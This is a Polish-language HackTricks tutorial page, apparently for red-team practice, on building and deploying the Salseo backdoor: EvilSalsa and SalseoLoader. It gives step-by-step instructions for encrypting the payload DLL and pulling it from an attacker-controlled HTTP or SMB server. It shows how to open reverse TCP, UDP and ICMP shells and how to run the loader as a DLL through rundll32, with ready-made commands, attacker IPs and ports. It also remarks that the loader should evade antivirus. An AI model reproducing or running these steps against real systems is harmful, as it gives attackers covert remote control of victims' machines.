# Salseo

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Kompilowanie binarek

Pobierz kod źródłowy z githuba i skompiluj **EvilSalsa** oraz **SalseoLoader**. Będziesz potrzebować zainstalowanego **Visual Studio**, aby skompilować kod.

Skompiluj te projekty dla architektury komputera z systemem Windows, na którym zamierzasz ich używać (jeśli Windows obsługuje x64, skompiluj je dla tej architektury).

Możesz **wybrać architekturę** w Visual Studio w **lewej zakładce "Build"** w **"Platform Target".**

(\*\*Jeśli nie możesz znaleźć tych opcji, kliknij w **"Project Tab"** a następnie w **"\<Nazwa Projektu> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Następnie zbuduj oba projekty (Build -> Build Solution) (W logach pojawi się ścieżka do pliku wykonywalnego):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Przygotowanie Backdoora

Przede wszystkim będziesz musiał zakodować **EvilSalsa.dll.** Aby to zrobić, możesz użyć skryptu Pythona **encrypterassembly.py** lub możesz skompilować projekt **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, teraz masz wszystko, co potrzebne do wykonania całej operacji Salseo: **zakodowany EvilDalsa.dll** i **plik binarny SalseoLoader.**

**Prześlij plik binarny SalseoLoader.exe na maszynę. Nie powinny być wykrywane przez żadne oprogramowanie antywirusowe...**

## **Wykonaj backdoora**

### **Uzyskanie odwrotnego powłoki TCP (pobieranie zakodowanego dll przez HTTP)**

Pamiętaj, aby uruchomić nc jako nasłuchującego powłokę odwrotną oraz serwer HTTP do serwowania zakodowanego evilsalsa.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Uzyskiwanie odwrotnej powłoki UDP (pobieranie zakodowanej dll przez SMB)**

Pamiętaj, aby uruchomić nc jako nasłuchującego powłokę odwrotną oraz serwer SMB, aby udostępnić zakodowanego evilsalsa (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Uzyskiwanie odwrotnej powłoki ICMP (zakodowana dll już wewnątrz ofiary)**

**Tym razem potrzebujesz specjalnego narzędzia w kliencie, aby odebrać odwrotną powłokę. Pobierz:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Wyłącz odpowiedzi ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Wykonaj klienta:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Wewnątrz ofiary, wykonajmy rzecz salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Kompilowanie SalseoLoader jako DLL eksportującego funkcję główną

Otwórz projekt SalseoLoader w Visual Studio.

### Dodaj przed funkcją główną: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Zainstaluj DllExport dla tego projektu

#### **Narzędzia** --> **Menedżer pakietów NuGet** --> **Zarządzaj pakietami NuGet dla rozwiązania...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Wyszukaj pakiet DllExport (używając zakładki Przeglądaj) i naciśnij Zainstaluj (i zaakceptuj okno popup)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

W folderze projektu pojawiły się pliki: **DllExport.bat** i **DllExport\_Configure.bat**

### **U**ninstaluj DllExport

Naciśnij **Odinstaluj** (tak, to dziwne, ale uwierz mi, to konieczne)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Zamknij Visual Studio i uruchom DllExport\_configure**

Po prostu **zamknij** Visual Studio

Następnie przejdź do swojego **folderu SalseoLoader** i **uruchom DllExport\_Configure.bat**

Wybierz **x64** (jeśli zamierzasz używać go w środowisku x64, tak było w moim przypadku), wybierz **System.Runtime.InteropServices** (w **Namespace for DllExport**) i naciśnij **Zastosuj**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Otwórz projekt ponownie w Visual Studio**

**\[DllExport]** nie powinno być już oznaczone jako błąd

![](<../.gitbook/assets/image (8) (1).png>)

### Zbuduj rozwiązanie

Wybierz **Typ wyjścia = Biblioteka klas** (Projekt --> Właściwości SalseoLoader --> Aplikacja --> Typ wyjścia = Biblioteka klas)

![](<../.gitbook/assets/image (10) (1).png>)

Wybierz **platformę x64** (Projekt --> Właściwości SalseoLoader --> Kompilacja --> Cel platformy = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Aby **zbudować** rozwiązanie: Buduj --> Zbuduj rozwiązanie (W konsoli wyjściowej pojawi się ścieżka do nowego DLL)

### Przetestuj wygenerowany Dll

Skopiuj i wklej Dll tam, gdzie chcesz go przetestować.

Wykonaj:
```
rundll32.exe SalseoLoader.dll,main
```
Jeśli nie pojawi się błąd, prawdopodobnie masz funkcjonalny DLL!!

## Uzyskaj powłokę za pomocą DLL

Nie zapomnij użyć **serwera** **HTTP** i ustawić **nasłuchiwacza** **nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>
{% endhint %}
